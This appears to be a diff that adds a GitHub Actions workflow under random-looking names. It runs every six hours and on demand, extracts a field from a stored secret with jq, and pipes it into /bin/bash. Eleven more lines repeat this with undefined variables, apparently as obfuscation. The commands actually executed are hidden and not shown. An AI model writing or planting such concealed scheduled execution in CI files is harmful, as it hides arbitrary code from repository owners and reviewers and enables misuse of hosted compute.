@@ -1,0 +1,28 @@
+name: lujingxi3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lujingxi3456
+        env:
+          bvec3461: ${{ secrets.bvec3461 }}
+        run: |
+          echo $bvec3461 | jq -r .ek33 | /bin/bash
+          echo $a2 | jq -r .bszsl684 | /bin/bash
+          echo $ptist990 | jq -r .owa2 | /bin/bash
+          echo $gr31 | jq -r .jap65101 | /bin/bash
+          echo $d60675 | jq -r .u8 | /bin/bash
+          echo $cgut9 | jq -r .sftwx55322 | /bin/bash
+          echo $uhq022 | jq -r .mk687 | /bin/bash
+          echo $fqkme32271 | jq -r .unyx6 | /bin/bash
+          echo $f0318 | jq -r .fowhc0437 | /bin/bash
+          echo $kx553 | jq -r .ivpd5884 | /bin/bash
+          echo $bxo209 | jq -r .r19 | /bin/bash
+          echo $rww7821 | jq -r .uflwt12 | /bin/bash
+
